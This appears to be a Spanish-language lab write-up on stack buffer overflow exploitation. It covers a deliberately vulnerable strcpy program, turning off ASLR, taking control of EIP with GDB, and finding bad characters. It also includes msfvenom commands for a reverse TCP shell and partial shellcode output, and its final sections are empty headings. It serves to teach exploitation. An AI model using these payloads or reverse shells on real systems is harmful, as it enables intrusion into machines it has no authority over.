# Vulnerable Program

Ahora estamos escribiendo un programa C simple llamado ``bow.c`` con una función vulnerable llamada ``strcpy()``.

## Bow.c

```c
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int bowfunc(char *string) {

	char buffer[1024];
	strcpy(buffer, string);
	return 1;
}

int main(int argc, char *argv[]) {

	bowfunc(argv[1]);
	printf("Done.\n");
	return 1;
}
```
## Desactivar ASLR

Los sistemas operativos modernos tienen protecciones integradas contra este tipo de vulnerabilidades, como la aleatorización del diseño del espacio de direcciones (ASLR). Con el fin de aprender los conceptos básicos de la explotación del desbordamiento de búfer, vamos a desactivar estas funciones de protección de memoria:

```shell-session
student@nix-bow:~$ sudo su
root@nix-bow:/home/student# echo 0 > /proc/sys/kernel/randomize_va_space
root@nix-bow:/home/student# cat /proc/sys/kernel/randomize_va_space

0
```
## Compilación

A continuación, compilamos el código C en un binario ELF de 32 bits.

```shell-session
student@nix-bow:~$ sudo apt install gcc-multilib
student@nix-bow:~$ gcc bow.c -o bow32 -fno-stack-protector -z execstack -m32
student@nix-bow:~$ file bow32 | tr "," "\n"

bow: ELF 32-bit LSB shared object
 Intel 80386
 version 1 (SYSV)
 dynamically linked
 interpreter /lib/ld-linux.so.2
 for GNU/Linux 3.2.0
 BuildID[sha1]=93dda6b77131deecaadf9d207fdd2e70f47e1071
 not stripped
```
# Funciones C vulnerables

Existen varias funciones vulnerables en el lenguaje de programación C que no protegen la memoria de forma independiente. Estas son algunas de ellas:

- `strcpy`
- `gets`
- `sprintf`
- `scanf`
- `strcat`
- ...

# Presentacion del GDB

GDB, o GNU Debugger, es el depurador estándar de los sistemas Linux desarrollado por el Proyecto GNU. Se ha adaptado a muchos sistemas y es compatible con los lenguajes de programación C, C++, Objective-C, FORTRAN, Java y muchos más.

GDB nos proporciona las características habituales de trazabilidad como puntos de interrupción o salida de traza de pila y nos permite intervenir en la ejecución de programas. También nos permite, por ejemplo, manipular las variables de la aplicación o llamar a funciones independientemente de la ejecución normal del programa.

Usamos `GNU Debugger`( `GDB`) para visualizar el binario creado en el nivel de ensamblador. Una vez que hayamos ejecutado el binario con `GDB`, podemos desensamblar la función principal del programa.

## GDB - Sintaxis de AT&T

```shell-session
student@nix-bow:~$ gdb -q bow32

Reading symbols from bow...(no debugging symbols found)...done.
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>: 	lea    0x4(%esp),%ecx
   0x00000586 <+4>: 	and    $0xfffffff0,%esp
   0x00000589 <+7>: 	pushl  -0x4(%ecx)
   0x0000058c <+10>:	push   %ebp
   0x0000058d <+11>:	mov    %esp,%ebp
   0x0000058f <+13>:	push   %ebx
   0x00000590 <+14>:	push   %ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    $0x1a3e,%ebx
   0x0000059c <+26>:	mov    %ecx,%eax
   0x0000059e <+28>:	mov    0x4(%eax),%eax
   0x000005a1 <+31>:	add    $0x4,%eax
   0x000005a4 <+34>:	mov    (%eax),%eax
   0x000005a6 <+36>:	sub    $0xc,%esp
   0x000005a9 <+39>:	push   %eax
   0x000005aa <+40>:	call   0x54d <bowfunc>
   0x000005af <+45>:	add    $0x10,%esp
   0x000005b2 <+48>:	sub    $0xc,%esp
   0x000005b5 <+51>:	lea    -0x1974(%ebx),%eax
   0x000005bb <+57>:	push   %eax
   0x000005bc <+58>:	call   0x3e0 <puts@plt>
   0x000005c1 <+63>:	add    $0x10,%esp
   0x000005c4 <+66>:	mov    $0x1,%eax
   0x000005c9 <+71>:	lea    -0x8(%ebp),%esp
   0x000005cc <+74>:	pop    %ecx
   0x000005cd <+75>:	pop    %ebx
   0x000005ce <+76>:	pop    %ebp
   0x000005cf <+77>:	lea    -0x4(%ecx),%esp
   0x000005d2 <+80>:	ret    
End of assembler dump.
```

## GDB - Change the Syntax to Intel

```shell-session
(gdb) set disassembly-flavor intel
(gdb) disassemble main

Dump of assembler code for function main:
   0x00000582 <+0>:	    lea    ecx,[esp+0x4]
   0x00000586 <+4>:	    and    esp,0xfffffff0
   0x00000589 <+7>:	    push   DWORD PTR [ecx-0x4]
   0x0000058c <+10>:	push   ebp
   0x0000058d <+11>:	mov    ebp,esp
   0x0000058f <+13>:	push   ebx
   0x00000590 <+14>:	push   ecx
   0x00000591 <+15>:	call   0x450 <__x86.get_pc_thunk.bx>
   0x00000596 <+20>:	add    ebx,0x1a3e
   0x0000059c <+26>:	mov    eax,ecx
   0x0000059e <+28>:	mov    eax,DWORD PTR [eax+0x4]
<SNIP>
```

## Change GDB Syntax permanently

```shell-session
student@nix-bow:~$ echo 'set disassembly-flavor intel' > ~/.gdbinit
```

# Exploitation
## Take Control of EIP

#### Falla de segmentación

```shell-session
student@nix-bow:~$ gdb -q bow32

(gdb) run $(python -c "print '\x55' * 1200")
Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1200")

Program received signal SIGSEGV, Segmentation fault.
0x55555555 in ?? ()
```

Si insertamos 1200 "`U`" (hex "`55`") como entrada, podemos ver a partir de la información del registro que hemos sobrescrito el `EIP`. Hasta donde sabemos, el `EIP`apunta a la siguiente instrucción que se ejecutará.

```shell-session
(gdb) info registers 

eax            0x1	1
ecx            0xffffd6c0	-10560
edx            0xffffd06f	-12177
ebx            0x55555555	1431655765
esp            0xffffcfd0	0xffffcfd0
ebp            0x55555555	0x55555555		# <---- EBP overwritten
esi            0xf7fb5000	-134524928
edi            0x0	0
eip            0x55555555	0x55555555		# <---- EIP overwritten
eflags         0x10286	[ PF SF IF RF ]
cs             0x23	35
ss             0x2b	43
ds             0x2b	43
es             0x2b	43
fs             0x0	0
gs             0x63	99
```

#### Determinar el desplazamiento

El desplazamiento se utiliza para determinar cuántos bytes se necesitan para sobrescribir el búfer y cuánto espacio tenemos alrededor de nuestro shellcode.

#### Crear patrón

```shell-session
0xRh4ps00dy@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1200 > pattern.txt
0xRh4ps00dy@htb[/htb]$ cat pattern.txt

Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9
```

#### GDB - Uso de patrones generados

```shell-session
(gdb) run $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'") 

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5...<SNIP>...Bn6Bn7Bn8Bn9'")
Program received signal SIGSEGV, Segmentation fault.
0x69423569 in ?? ()
```

#### BGF - EIP

```shell-session
(gdb) info registers eip

eip            0x69423569	0x69423569
```

#### GDB - Desplazamiento

```shell-session
0xRh4ps00dy@htb[/htb]$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x69423569

[*] Exact match at offset 1036
```

#### Desplazamiento del GDB

Si ahora usamos precisamente esta cantidad de bytes para nuestros "`U`", deberíamos llegar exactamente al `EIP`. Para sobrescribirlo y verificar si lo hemos alcanzado como lo habíamos planeado, podemos agregar 4 bytes más con " `\x66`" y ejecutarlo para asegurarnos de que controlamos el `EIP`.

```shell-session
(gdb) run $(python -c "print '\x55' * 1036 + '\x66' * 4")

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c "print '\x55' * 1036 + '\x66' * 4")
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```
## Determine the Length for Shellcode

Ahora debemos averiguar cuánto espacio tenemos para que nuestro shellcode realice la acción que queremos. Es muy común y útil que aprovechemos esta vulnerabilidad para obtener un shell inverso. Primero, tenemos que averiguar aproximadamente qué tamaño tendrá el shellcode que insertaremos y, para ello, utilizaremos `msfvenom`.

#### Código Shell - Longitud

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 lport=31337 --platform linux --arch x86 --format c

No encoder or badchars specified, outputting raw payload
Payload size: 68 bytes
<SNIP>
```

Ahora sabemos que nuestra carga útil será de aproximadamente 68 bytes. Como precaución, deberíamos intentar utilizar un rango mayor si el código shell aumenta debido a especificaciones posteriores.

A menudo puede resultar útil insertar algunos `no operation instruction`( `NOPS`) antes de que comience nuestro shellcode para que se pueda ejecutar sin problemas. Resumamos brevemente lo que necesitamos para esto:

1. Necesitamos un total de 1040 bytes para llegar al `EIP`.
2. Aquí podemos utilizar un adicional `100 bytes`de`NOPs`
3. `150 bytes`para nuestro `shellcode`.

```shell-session
   Buffer = "\x55" * (1040 - 100 - 150 - 4) = 786
     NOPs = "\x90" * 100
Shellcode = "\x44" * 150
      EIP = "\x66" * 4
```

![](../Images/Pasted%20image%2020240920125948.png)

#### GFB

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 100 - 150 - 4) + "\x90" * 100 + "\x44" * 150 + "\x66" * 4')
Program received signal SIGSEGV, Segmentation fault.
0x66666666 in ?? ()
```

#### Buffer

![imagen](https://academy.hackthebox.com/storage/modules/31/buffer_overflow_7.png)

## Identifications of Bad Characters

Anteriormente, en los sistemas operativos tipo UNIX, los binarios comenzaban con dos bytes que contenían un " `magic number`" que determinaba el tipo de archivo. Al principio, esto se usaba para identificar archivos de objetos para diferentes plataformas. Poco a poco, este concepto se trasladó a otros archivos y ahora casi todos los archivos contienen un número mágico.

Estos caracteres reservados también existen en las aplicaciones, pero no siempre aparecen ni son siempre los mismos. Estos caracteres reservados, también conocidos como `bad characters`pueden variar, pero a menudo veremos caracteres como estos:

- `\x00`- Byte nulo
- `\x0A`- Avance de línea
- `\x0D`- Retorno de carro
- `\xFF`- Feed de formulario

Aquí usamos la siguiente lista de caracteres para descubrir todos los caracteres que debemos considerar y evitar al generar nuestro shellcode.

```shell-session
0xRh4ps00dy@htb[/htb]$ CHARS="\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
```

#### Calcular longitud de CHARS

Para calcular la cantidad de bytes en nuestra variable CHARS, podemos usar bash reemplazando "\x" con espacio y luego usar `wc`para contar las palabras.

```shell-session
0xRh4ps00dy@htb[/htb]$ echo $CHARS | sed 's/\\x/ /g' | wc -w

256
```

Esta cadena tiene `256`una longitud de bytes, por lo que debemos calcular nuestro búfer nuevamente.

```shell-session
Buffer = "\x55" * (1040 - 256 - 4) = 780
 CHARS = "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfd\xfe\xff"
   EIP = "\x66" * 4
```

Ahora veamos la función principal completa, ya que si la ejecutamos ahora, el programa se bloqueará sin darnos la posibilidad de seguir lo que sucede en la memoria. Por lo tanto, estableceremos un punto de interrupción en la función correspondiente para que la ejecución se detenga en este punto y podamos analizar el contenido de la memoria.

#### Punto de interrupción del GDB

Para establecer el punto de interrupción, damos el comando "`break`" con el nombre de la función correspondiente.

```shell-session
(gdb) break bowfunc 

Breakpoint 1 at 0x56555551
```

#### Enviar CHARS

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 256 - 4) + "\x00\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
/bin/bash: warning: command substitution: ignored null byte in input

Breakpoint 1, 0x56555551 in bowfunc ()
```

Después de haber ejecutado nuestro buffer con los caracteres incorrectos y haber alcanzado el punto de interrupción, podemos mirar la pila.

```shell-session
(gdb) x/2000xb $esp+500

0xffffd28a:	0xbb	0x69	0x36	0x38	0x36	0x00	0x00	0x00
0xffffd292:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xffffd29a:	0x00	0x2f	0x68	0x6f	0x6d	0x65	0x2f	0x73
0xffffd2a2:	0x74	0x75	0x64	0x65	0x6e	0x74	0x2f	0x62
0xffffd2aa:	0x6f	0x77	0x2f	0x62	0x6f	0x77	0x33	0x32
0xffffd2b2:	0x00    0x55	0x55	0x55	0x55	0x55	0x55	0x55
				 # |---> "\x55"s begin

0xffffd2ba: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd2c2: 0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
<SNIP>
```

Aquí reconocemos en qué dirección `\x55`comienza nuestro " ". A partir de aquí, podemos ir más abajo y buscar el lugar donde `CHARS`comienza nuestro " ".

```shell-session
<SNIP>
0xffffd5aa:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5b2:	0x55	0x55	0x55	0x55	0x55	0x55	0x55	0x55
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
												 # |---> CHARS begin

0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
0xffffd5d2:	0x15	0x16	0x17	0x18	0x19	0x1a	0x1b	0x1c
<SNIP>
```

Vemos dónde `\x55`termina nuestro " " y dónde `CHARS`comienza la variable. Pero si lo observamos de cerca, veremos que comienza con " `\x01`" en lugar de " `\x00`". Ya hemos visto la advertencia durante la ejecución de que `null byte`se ignoró el en nuestra entrada.

Así que podemos tomar nota de este carácter, eliminarlo de nuestra variable `CHARS`y ajustar el número de nuestro " `\x55`".

```shell-session
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 255 - 4) = 781

# "\x00" removed: 256 - 1 = 255 bytes
 CHARS = "\x01\x02\x03...<SNIP>...\xfd\xfe\xff"
 
   EIP = "\x66" * 4
```

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 255 - 4) + "\x01\x02\x03\x04\x05...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```

```shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x09" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

Aquí depende del orden correcto de nuestros bytes en la variable `CHARS`para ver si algún carácter cambia, interrumpe o se salta el orden. Ahora reconocemos que después del " `\x08`", encontramos el " `\x00`" en lugar del " `\x09`" como se esperaba. Esto nos indica que este carácter no está permitido aquí y debe eliminarse en consecuencia.

```shell-session
# Substract the number of removed characters
Buffer = "\x55" * (1040 - 254 - 4) = 782	

# "\x00" & "\x09" removed: 256 - 2 = 254 bytes
 CHARS = "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfd\xfe\xff" 
 
   EIP = "\x66" * 4
```

```shell-session
(gdb) run $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')

The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/student/bow/bow32 $(python -c 'print "\x55" * (1040 - 254 - 4) + "\x01\x02\x03\x04\x05\x06\x07\x08\x0a\x0b...<SNIP>...\xfc\xfd\xfe\xff" + "\x66" * 4')
Breakpoint 1, 0x56555551 in bowfunc ()
```

```shell-session
(gdb) x/2000xb $esp+550

<SNIP>
0xffffd5ba:	0x55	0x55	0x55	0x55	0x55	0x01	0x02	0x03
0xffffd5c2:	0x04	0x05	0x06	0x07	0x08	0x00	0x0b	0x0c
												 # |----| <- "\x0a" expected

0xffffd5ca:	0x0d	0x0e	0x0f	0x10	0x11	0x12	0x13	0x14
<SNIP>
```

Este proceso debe repetirse hasta eliminar todos los caracteres que podrían interrumpir el flujo.

## Generating Shellcode

#### MSFvenom Syntax

```shell-session
0xRh4ps00dy@htb[/htb]$ msfvenom -p linux/x86/shell_reverse_tcp lhost=<LHOST> lport=<LPORT> --format c --arch x86 --platform linux --bad-chars "<chars>" --out <filename>
```

#### Shellcode

  ellcode

```shell-session
0xRh4ps00dy@htb[/htb]$ cat shellcode

unsigned char buf[] = 
"\xda\xca\xba\xe4\x11\xd4\x5d\xd9\x74\x24\xf4\x58\x29\xc9\xb1"
"\x12\x31\x50\x17\x03\x50\x17\x83\x24\x15\x36\xa8\x95\xcd\x41"
"\xb0\x86\xb2\xfe\x5d\x2a\xbc\xe0\x12\x4c\x73\x62\xc1\xc9\x3b"
<SNIP>
```



## Generating Shell



## Identification of the Return Address

